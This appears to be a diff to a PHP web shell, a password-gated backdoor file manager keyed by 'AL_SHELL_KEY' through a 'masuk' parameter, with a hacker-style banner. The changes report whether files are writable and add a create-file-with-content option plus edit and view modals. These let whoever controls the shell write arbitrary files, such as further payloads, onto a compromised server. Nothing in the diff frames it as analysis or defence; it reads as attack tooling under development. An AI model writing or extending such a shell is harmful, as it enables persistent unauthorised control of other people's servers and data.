@@ -960,15 +960,16 @@ if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
     $filepath = $dir . DIRECTORY_SEPARATOR . $file;
     if (is_file($filepath)) {
         $raw = @file_get_contents($filepath);
+        $isWritable = is_writable($filepath);
         header('Content-Type: application/json');
-        if (mb_check_encoding($raw, 'UTF-8')) {
-            echo json_encode(['content' => $raw]);
-        } else {
-            echo json_encode(['content' => '[File is binary or not UTF-8 compatible]']);
-        }
+        $response = [
+            'content' => mb_check_encoding($raw, 'UTF-8') ? $raw : '[File is binary or not UTF-8 compatible]',
+            'writable' => $isWritable
+        ];
+        echo json_encode($response);
     } else {
         http_response_code(404);
-        echo json_encode(['content' => 'File not found.']);
+        echo json_encode(['content' => 'File not found.', 'writable' => false]);
     }
     exit;
 }
@@ -2133,7 +2134,11 @@ if (isset($_FILES['upload_file'])) {
 if (isset($_POST['create_type'], $_POST['create_name'])) {
     $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['create_name']);
     if ($_POST['create_type'] === 'file') {
-        file_put_contents($newPath, '');
+        $content = '';
+        if (isset($_POST['create_mode']) && $_POST['create_mode'] === 'content' && isset($_POST['create_content'])) {
+            $content = $_POST['create_content'];
+        }
+        file_put_contents($newPath, $content);
         $output = "File created.";
     } elseif ($_POST['create_type'] === 'dir') {
         mkdir($newPath);
@@ -2232,10 +2237,18 @@ function list_dir($path) {
         if (!$isWritable) {
             $linkClass .= ' not-writable-text';
         }
-        $nameLink = $isDir 
-            ? "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>" 
-            : "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
-        
+        // Jika file, klik masuk ke edit mode (atau view jika tidak writable)
+        if ($isDir) {
+            $nameLink = "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
+        } else {
+            if ($isWritable) {
+                $escapedF = htmlspecialchars($f, ENT_QUOTES);
+                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='openEditModal(\\"$escapedF\\")'>$encoded</a>";
+            } else {
+                $escapedF = htmlspecialchars($f, ENT_QUOTES);
+                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='viewFileAsync(\\"$escapedF\\")'>$encoded</a>";
+            }
+        }
         if ($isDir) {
             $size = '-';
         } else {
@@ -2283,6 +2296,8 @@ function list_dir($path) {
         input[type="checkbox"], input[type="radio"] { width: auto; vertical-align: middle; margin-right: 8px; }
         button { padding: 8px 12px; background: #0f0; color: #111; border: none; cursor: pointer; font-weight: bold; margin-right: 5px;}
         button:disabled { background: #444; color: #666; cursor: not-allowed; }
+        button.no-edit { background: #f44 !important; color: #fff !important; cursor: not-allowed !important; text-decoration: line-through !important; }
+        textarea[readonly] { background: #1a1a1a !important; color: #888 !important; cursor: not-allowed !important; }
         .output { white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #0f0; margin-top: 10px; word-wrap: break-word; }
         .section { margin-bottom: 8px; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; }
         .section pre { font-size: 11px; line-height: 1.3; }
@@ -2432,7 +2447,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2052</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2127</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -2475,13 +2490,22 @@ function list_dir($path) {
         <!-- Create Section - Compact -->
         <div class="section">
             <h3>➕ Create</h3>
-            <form method="post" style="display: flex; gap: 5px;">
-                <input type="text" name="create_name" placeholder="Name" style="flex: 1; margin-bottom: 0;">
-                <select name="create_type" style="width: 80px; margin-bottom: 0;">
+            <form method="post" id="createForm" style="display: flex; flex-direction: column; gap: 5px;">
+                <input type="text" name="create_name" placeholder="Name" style="margin-bottom: 0;">
+                <select name="create_type" id="createType" style="margin-bottom: 0;" onchange="toggleCreateContent()">
                     <option value="file">File</option>
                     <option value="dir">Dir</option>
                 </select>
-                <button type="submit" style="margin-bottom: 0; padding: 5px 10px;">➕</button>
+                <div id="createOptions" style="display: flex; gap: 10px; font-size: 11px; margin-bottom: 0;">
+                    <label style="display: flex; align-items: center; gap: 3px; cursor: pointer;">
+                        <input type="radio" name="create_mode" value="empty" checked onchange="toggleCreateContent()" style="margin: 0;"> Empty
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 3px; cursor: pointer;">
+                        <input type="radio" name="create_mode" value="content" onchange="toggleCreateContent()" style="margin: 0;"> With Content
+                    </label>
+                </div>
+                <textarea name="create_content" id="createContent" placeholder="File content..." style="display: none; margin-bottom: 0; height: 100px; resize: vertical;"></textarea>
+                <button type="submit" style="margin-bottom: 0; padding: 5px 10px;">➕ Create</button>
             </form>
         </div>
         <!-- Database Section - Compact -->
@@ -2542,6 +2566,7 @@ function list_dir($path) {
             <pre id="viewContent">⏳ Loading...</pre>
         </div>
         <div class="modal-footer">
+            <button id="viewEditBtn" onclick="switchToEditMode()">Edit</button>
             <button onclick="closeModal('viewModal')">Close</button>
         </div>
     </div>
@@ -2555,7 +2580,7 @@ function list_dir($path) {
             <input type="hidden" name="edit_file" id="editFile">
             <textarea name="file_content" id="editContent"></textarea>
             <div class="modal-footer">
-                <button type="submit" name="save_edit">Save</button>
+                <button type="submit" name="save_edit" id="editSaveBtn">Save</button>
                 <button type="button" onclick="closeModal('editModal')">Cancel</button>
             </div>
         </form>
@@ -3190,23 +3215,68 @@ function viewFileAsync(fileName) {
     const modal = document.getElementById('viewModal');
     const title = document.getElementById('viewTitle');
     const content = document.getElementById('viewContent');
+    const editBtn = document.getElementById('viewEditBtn');
+    
+    // Store current file name for edit mode switch
+    modal.dataset.currentFile = fileName;
+    
     title.textContent = 'View: ' + fileName;
     content.textContent = '⏳ Loading...';
+    
+    // Reset button state
+    editBtn.disabled = false;
+    editBtn.classList.remove('no-edit');
+    editBtn.textContent = 'Edit';
+    
     openModal('viewModal');
     fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
         .then(response => response.json())
-        .then(data => { content.textContent = data.content; })
+        .then(data => { 
+            content.textContent = data.content;
+            // Handle writable status
+            if (!data.writable) {
+                editBtn.disabled = true;
+                editBtn.classList.add('no-edit');
+                editBtn.textContent = 'No Edit Permission';
+            }
+        })
         .catch(error => { content.textContent = 'Error loading file: ' + error; });
+}
+function switchToEditMode() {
+    const modal = document.getElementById('viewModal');
+    const fileName = modal.dataset.currentFile;
+    closeModal('viewModal');
+    openEditModal(fileName);
 }
 function openEditModal(fileName) {
     const modal = document.getElementById('editModal');
+    const saveBtn = document.getElementById('editSaveBtn');
+    const contentArea = document.getElementById('editContent');
+    
     document.getElementById('editTitle').textContent = 'Edit: ' + fileName;
     document.getElementById('editFile').value = fileName;
-    document.getElementById('editContent').value = '⏳ Loading...';
+    contentArea.value = '⏳ Loading...';
+    
+    // Reset button state
+    saveBtn.disabled = false;
+    saveBtn.classList.remove('no-edit');
+    saveBtn.textContent = 'Save';
+    
     openModal('editModal');
     fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
         .then(response => response.json())
-        .then(data => { document.getElementById('editContent').value = data.content; });
+        .then(data => { 
+            document.getElementById('editContent').value = data.content;
+            // Handle writable status
+            if (!data.writable) {
+                saveBtn.disabled = true;
+                saveBtn.classList.add('no-edit');
+                saveBtn.textContent = 'No Edit Permission';
+                contentArea.readOnly = true;
+            } else {
+                contentArea.readOnly = false;
+            }
+        });
 }
 function openRenameModal(fileName) {
     document.getElementById('renameTitle').textContent = 'Rename: ' + fileName;
@@ -3226,6 +3296,24 @@ function openDeleteModal(fileName) {
     document.getElementById('deleteMessage').textContent = `Are you sure you want to delete "${fileName}"?`;
     document.getElementById('deleteTarget').value = fileName;
     openModal('confirmDeleteModal');
+}
+function toggleCreateContent() {
+    const createType = document.getElementById('createType').value;
+    const createOptions = document.getElementById('createOptions');
+    const createContent = document.getElementById('createContent');
+    const createMode = document.querySelector('input[name="create_mode"]:checked');
+    
+    if (createType === 'dir') {
+        createOptions.style.display = 'none';
+        createContent.style.display = 'none';
+    } else {
+        createOptions.style.display = 'flex';
+        if (createMode && createMode.value === 'content') {
+            createContent.style.display = 'block';
+        } else {
+            createContent.style.display = 'none';
+        }
+    }
 }
 function goToDefaultDirectory() {
     window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($default_dir) ?>';
